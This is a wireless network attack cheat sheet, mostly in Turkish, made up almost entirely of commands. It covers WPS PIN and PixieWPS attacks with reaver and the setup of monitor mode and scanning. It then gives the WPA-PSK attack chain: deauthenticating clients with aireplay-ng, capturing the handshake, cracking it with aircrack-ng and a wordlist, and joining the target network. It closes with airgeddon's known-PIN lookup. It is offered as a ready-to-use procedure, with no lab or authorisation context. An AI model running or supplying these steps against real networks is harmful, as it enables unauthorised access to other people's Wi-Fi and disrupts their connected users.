 
## WPS Attack ##

  wash –i wlan0
  reaver –b <BSSID> –i wlan0 -vv –S
  or 
  for PixieWPS attack you can use "-K" parameter
  reaver -b 13:06:19:94:00:00 -i wlan0mon -v -K


## 🎯 GENEL HAZIRLIK

### İnterface Hazırlama
```bash
# Mevcut interface'leri listele
iwconfig
ip -br -c a

# Monitor mod başlat
airmon-ng check kill
airmon-ng start wlan0

# Bilgi kontrol
iw dev wlan0mon info
```

### Temel Tarama
```bash
# Tüm bantları tara (2.4GHz + 5GHz)
airodump-ng wlan0mon --band abg

# WPS bilgisi ile tara
airodump-ng wlan0mon --band abg --wps --manufacturer
```

---

## 🔴 SENARYO 1: WPA-PSK SALDIRISI

### Adım 1: Hedef Belirleme
```bash
airodump-ng wlan0mon --band abg
# Not al: BSSID, ESSID, Channel, Client MAC
```

### Adım 2: Hedef Ağı İzle
```bash
airodump-ng wlan0mon -c [CHANNEL] --bssid [BSSID] -w capture
# Yeni terminal aç:
```

### Adım 3: Deauth + Handshake Yakala
```bash
# Bir istemciyi kov
aireplay-ng -0 5 -a [BSSID] -c [CLIENT_MAC] wlan0mon

# Veya tüm istemcileri kov
aireplay-ng -0 5 -a [BSSID] wlan0mon

# İlk terminalde "WPA handshake: [BSSID]" görününce Ctrl+C
```

### Adım 4: Parola Kır
```bash
aircrack-ng -w /usr/share/john/password.lst capture-01.cap -e [ESSID]
# KEY FOUND! çıktısını bekle
```

### Adım 5: Bağlan
```bash
# Monitor modu durdur
airmon-ng stop wlan0mon

# Config oluştur
nano wpa.conf
```
```
network={
    ssid="[ESSID]"
    scan_ssid=1
    psk="[PAROLA]"
    key_mgmt=WPA-PSK
}
```
```bash
wpa_supplicant -D nl80211 -i wlan0 -c wpa.conf &
dhclient wlan0 -v
```

## Extra - Implementation Variations ##

  sudo apt install airgeddon
  source /usr/share/airgeddon/known_pins.db
  echo ${PINDB["0013F7"]}
